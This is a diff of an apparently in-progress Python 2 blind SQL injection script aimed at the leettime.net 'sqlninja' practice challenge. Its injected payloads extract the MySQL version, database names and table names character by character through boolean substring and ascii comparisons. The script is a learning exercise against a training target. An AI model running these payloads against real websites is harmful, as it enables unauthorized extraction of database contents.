@@ -66,8 +66,12 @@ def enum_columns(url, bypass):
 
 # --------- Find SQL database version ----------
 def sql_version(url, bypass):
+    '''
+        Request working on leettime
+        Is the base request for finding the database version number
+        uri = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
+    '''
     for sql_version in range(4,7):
-        # uri = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
 
         uri = url + "' and "  + "substring(@@version,1,1)>=" + str(sql_version) + str(bypass)
         server_response = request_handler(uri)
@@ -88,7 +92,6 @@ def eunum_databases(url, bypass):
         Request working on leettime
         Is the base request for finding the number of databases, how many characters are in each database name
         ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)>=0 or '
-        TODO Find out how many databases by playing with limit
     '''
     database_increment = 0
 
@@ -121,7 +124,7 @@ def eunum_databases(url, bypass):
 
                             # Loop in ascii range to guess each character
                             for database_letter in range(1,128):
-                                uri = url + "' and substring((select schema_name from information_schema.schemata limit " + database_number + ",1)," + database_letter_count + ",1)>=" + database_letter + bypass
+                                uri = url + "' and ascii(substring((select schema_name from information_schema.schemata limit " + database_number + ",1)," + database_letter_count + ",1))>=" + database_letter + bypass
                                 server_response = request_handler(uri)
                                 server_response_status = validate_request(server_response)
 
@@ -151,9 +154,9 @@ def request_handler(url):
     if not session:
         session = requests.session()
 
-    page = session.get(url + request + bypass)
+    page = session.get(url)
 
-    return page
+    return page.content
 
 # --------- Confirm that request was executed ----------
 def validate_request(page):
@@ -167,75 +170,75 @@ def validate_request(page):
 if __name__ == "__main__":
     main()
 
-"""def main(argv):
-# ---- /!\
-   try:
-      opts, args = getopt.getopt(argv,"hi:o:",["ifile=","ofile="])
-   except getopt.GetoptError:
-      print 'test.py -i <inputfile> -o <outputfile>'
-      sys.exit(2)
-# ---- /!\
-   for opt, arg in opts:
-      if opt == '-h':
-         print "help"
-         sys.exit()
-     elif opt in ("-i", "--ifile"): #conditions
-         # actions
-     elif opt in ("-o", "--ofile"): #conditions
-         # actions
-"""
+# """def main(argv):
+# # ---- /!\
+#    try:
+#       opts, args = getopt.getopt(argv,"hi:o:",["ifile=","ofile="])
+#    except getopt.GetoptError:
+#       print 'test.py -i <inputfile> -o <outputfile>'
+#       sys.exit(2)
+# # ---- /!\
+#    for opt, arg in opts:
+#       if opt == '-h':
+#          print "help"
+#          sys.exit()
+#      elif opt in ("-i", "--ifile"): #conditions
+#          # actions
+#      elif opt in ("-o", "--ofile"): #conditions
+#          # actions
+# """
 
 # ----- Chose the mode -----------
 # url ou paramètres ?
 
 # ---- If url --------------
-url = "http://leettime.net/sqlninja.com/tasks/blind_ch1.php?id=1"
+# url = "http://leettime.net/sqlninja.com/tasks/blind_ch1.php?id=1"
 
 # changer session, inutile
-with requests.session() as session:
-    page = session.get(url)
-    htmlpage = page.content
-    print "Page 1\n", htmlpage, "\n"
-    htmlpage2 = ""
-    #    l_diff = []
-    for elem in l_injnum:
-        urli = url + " " + elem
-        page = requests.get(urli)
-        htmlpage2 = page.content
-        if ( htmlpage != htmlpage2 ):
-            break
-            #l_diff.append(elem)
-    print elem
-
-    for i in range(4,7):
-        urli = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
-        page = requests.get(urli)
-        htmlpage_version = page.content
-        if htmlpage2 == htmlpage_version:
-            break
-    if (i - 1 == 5 ):
-        print "Ok, version 5, on peut continuer"
+# with requests.session() as session:
+#     page = session.get(url)
+#     htmlpage = page.content
+#     print "Page 1\n", htmlpage, "\n"
+#     htmlpage2 = ""
+#     #    l_diff = []
+#     for elem in l_injnum:
+#         urli = url + " " + elem
+#         page = requests.get(urli)
+#         htmlpage2 = page.content
+#         if ( htmlpage != htmlpage2 ):
+#             break
+#             #l_diff.append(elem)
+#     print elem
+#
+#     for i in range(4,7):
+#         urli = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
+#         page = requests.get(urli)
+#         htmlpage_version = page.content
+#         if htmlpage2 == htmlpage_version:
+#             break
+#     if (i - 1 == 5 ):
+#         print "Ok, version 5, on peut continuer"
 
 # cette partie ne fonctionne pas :(
-    table = ""
-    for i in range (1,6):
-        for lettre in alphabet:
+    # table = ""
+    # for i in range (1,6):
+    #     for lettre in alphabet:
 #            urli = url + "' and "  + "ascii(substring((SELECT schema_name FROM information_schema.schemata LIMIT 0,1)," + str(i) +",1))>=" + str(ord(lettre)) + " or '"
-            urli = url + "' and "  + "ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)," + str(i) +",1))>=" + str(ord(lettre)) + " or '"
-            print urli
-            page = requests.get(urli)
-            htmlpage_table = page.content
+            # urli = url + "' and "  + "ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)," + str(i) +",1))>=" + str(ord(lettre)) + " or '"
+            # print urli
+            # page = requests.get(urli)
+            # htmlpage_table = page.content
             #if htmlpage2 == htmlpage_table:
-            if re.search('Get lost',htmlpage_table):
-                print "\nGet lost\n"
-            if re.search('Your are welcome',htmlpage_table):
-                print "\nYour are welcome\n"
-            if htmlpage != htmlpage_table:
-                print lettre
-                table = table + lettre
-                break
-        print i
-    print table
+    #         if re.search('Get lost',htmlpage_table):
+    #             print "\nGet lost\n"
+    #         if re.search('Your are welcome',htmlpage_table):
+    #             print "\nYour are welcome\n"
+    #         if htmlpage != htmlpage_table:
+    #             print lettre
+    #             table = table + lettre
+    #             break
+    #     print i
+    # print table
 
 
 """
